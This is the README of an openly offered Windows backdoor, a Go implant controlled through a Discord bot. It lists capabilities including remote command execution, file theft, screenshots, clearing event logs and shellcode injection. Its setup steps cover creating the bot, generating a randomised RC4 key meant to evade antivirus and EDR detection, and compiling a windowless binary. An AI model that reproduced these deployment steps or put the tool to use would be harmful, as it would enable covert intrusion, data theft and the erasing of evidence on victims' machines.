      git clone --recursive https://github.com/DK27ss/willie-v2


# Willie V2 - C2 Backdoor for Windows systems.
### Go implant using Discord as a C2 team server
### Still in development
<p align="center">
<img src="willie.png" width="250" >
</p>

## 💉 Features

- RC4 Encryption Tunneling
- Executing shell commands (cmd, powershell, wmic)
- Files and Directories (listing, removing...)
- Uploading and Downloading files
- Taking screenshots
- List attatched Drives
- Simple network scanner
- Processes listing
- Registry operations
- Clearing event logs
- Shellcode injection using HellsGate technique
- CLR binary injection
  
## ⚙️ Installation

- Clone this repos

      git clone --recursive https://github.com/DK27ss/willie-v2

- Check Token settings (setup_config.py)

## 📡 Setup

- Turn on Developer mode in Settings -> Advanced
- Create a new discord server, creating a channel is optional, you can use channel "general", copy its ID and save it in "setup_config.py" CHANNEL variable
- Visit discord developer dashboard
- Create new application
- Add a bot for the application (make sure you untick "PUBLIC BOT", and enable "MESSAGE CONTENT INTENT")
- Save the bot's token in "setup_config.py" TOKEN variable
- Go to OAuth2 -> URL Generator, tick the bot options in "SCOPES", then give it the appropriate permissions in the "BOT PERMISSIONS" section (Administrator permission is the quickest way), lastly visit the generated link and choose the server you want the bot to be added to.
- Run "setup_config.py".
- Compile "willie.go" by running `GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui" -trimpath`.

Everytime you run "setup_config.py" a new "config.go" file gets created with a randomized RC4 key responsible for decrypting strings to avoid triggering AV/EDR during static checks.
The program uses Mutex lock to prevent it from running more than once simultaneously.

## Demo

![Demo](https://user-images.githubusercontent.com/46089361/184121473-c7aa3378-1f38-4cec-ad26-d6aff31bdb2b.gif)


## 🥤 TODO

- [ ] Process Migration
- [ ] Process Token Manipulation
- [ ] Priviliage Escilation

### PRs are welcome
